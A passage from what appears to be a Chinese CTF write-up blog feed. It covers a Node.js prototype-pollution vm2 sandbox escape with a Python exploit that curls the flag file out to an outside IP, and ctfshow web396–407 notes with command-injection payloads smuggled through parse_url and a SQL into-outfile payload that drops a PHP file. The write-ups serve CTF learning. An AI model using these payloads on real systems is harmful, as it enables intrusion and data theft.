<span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;star   t listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403223122388.png" alt="image-20230403223122388"></p><p>nodejs无非就是考原型链污染，这里开头看到了vm2</p><p>简单审计一下发现存在clone和merge两个方法配合，存在原型链污染漏洞。而引入了vm2模块且存在后门<code>new VM().run(&#123;&#125;.shellcode);</code> 很容易就想到结合原型链污染进行vm2沙箱逃逸 vm2沙箱逃逸</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./app.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)</span><br><span class="line">().<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;curl http://117.78.4.229:2333&quot;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><p>这个app.js是源码    网上的exp大多输都是foo.js   </p><p>要注意区分</p><p>最终<strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;shit&quot;</span>:<span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&quot;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">res.toString.constructor(\&quot;return this\&quot;)</span></span><br><span class="line"><span class="string">().process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;whoami\&quot;).toString();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个payload在网上直接找是可以找到的，看起来并不是很难</p><p>这里就直接抓包弹shell了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    p = sys.argv</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python web3.py http://xxx.com/&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    url = p[<span class="number">1</span>].strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload=&#123;<span class="string">&quot;shit&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&#x27;&#x27;&#x27;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">    res.toString.constructor(&quot;return this&quot;)</span></span><br><span class="line"><span class="string">    ().process.mainModule.require(&quot;child_process&quot;).execSync(&quot;curl http://ip:8888/ -F file=@/flag&quot;).toString();&#x27;&#x27;&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">    requests.post(url,headers=headers,data=json.dumps(payload))</span><br></pre></td></tr></table></figure><p>用法</p><p><img src="../images/image-20230403230446064.png" alt="image-20230403230446064"></p><p>然后监听端口就行了，然后就会反弹到自己的服务器上了</p><p>这里不知道为啥用bp弹不上去，只能用py脚本才能弹上去</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;决赛wp ————&amp;gt;    &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg3NTg0OTAwMg==&amp;amp;mid=2247484079&amp;amp;idx=1&amp;amp;sn=74a1712eb4cbf5c905ea80e92</summary>
      
    
    
    
    
    <category term="杭师校赛决赛" scheme="https://ke1nys.github.io/tags/%E6%9D%AD%E5%B8%88%E6%A0%A1%E8%B5%9B%E5%86%B3%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-其他 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/f0c9bda6.html"/>
    <id>https://ke1nys.github.io/posts/f0c9bda6.html</id>
    <published>2023-03-30T13:04:08.000Z</published>
    <updated>2023-04-06T06:48:36.163Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:20:22</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.parse-url.php">parse_url</a> 的解释</p><p><img src="../images/image-20230330211747698.png" alt="image-20230330211747698"></p><p>然后这样的话host为空，就只有path了</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://1/1;echo `ls`&gt;a.txt</span><br><span class="line">url=http://1/1;echo `cat fl0g.php`&gt;a.txt</span><br></pre></td></tr></table></figure><p>这里的;换成||也行</p><h2 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:49:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是不影响</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web398-401"><a href="#web398-401" class="headerlink" title="web398-401"></a>web398-401</h2><p>一模一样的payload</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><p>因为它的正则匹配都是匹配host,然而我们的payload用的不是关于host的，用的是path的，所以说host一直为空，所以这个正则就一直绕过去了</p><h2 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:35:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话新增加了一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是必须得满足这个玩意</p><p>然后scheme会匹配文件头http，所以就不能用了，那么我们就用另一个</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:44:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增加的正则是对ip的判断，要满足才能进行命令执行</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web404"><a href="#web404" class="headerlink" title="web404"></a>web404</h2><p>题目</p><h2 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 19:20:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;parse_url 好强大&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">parse_url 好强大</span><br></pre></td></tr></table></figure><p>这里的话要满足host  path  scheme   三个条件</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=httphp:<span class="comment">//127.0.0.1111;echo `cat f*`&gt;1.txt;11/a</span></span><br></pre></td></tr></table></figure><p>这里是<strong>scheme://host/path</strong></p><p>记住这个格式就好</p><p><img src="../images/image-20230330224805520.png" alt="image-20230330224805520"></p><p>所以就能绕过</p><h2 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 16:00:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//flag in db</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不通过&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: url in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">不通过</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/kuaile1314/p/12319042.html">filter_var()绕过</a></p><p>这里是添加了sql语句来的，与上面给的文章说的内容不同，给的文章是利用JavaScript绕过</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&#x27;select flag from flag into outfile &quot;/var/www/html/1.txt&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">转为<span class="number">16</span>进制</span><br><span class="line">http:<span class="comment">//a53d40ee-9871-49a0-8f4a-5463bc97e052.chall.ctf.show/?url=0://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/&quot;/var/www/html/4.php&quot;%23</span></span><br><span class="line"></span><br><span class="line">访问<span class="number">1</span>.txt即可</span><br><span class="line">转化为<span class="number">16</span>进制绕过filter检测</span><br></pre></td></tr></table></figure><p>这里就是先把当</p><p><img src="../images/image-20230331155504698.png" alt="image-20230331155504698"></p><p>就会执行sql语句，然后把payload写到4.php上，然后访问4.php就会执行payload写的语句，然后访问1.txt就行了</p><h2 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 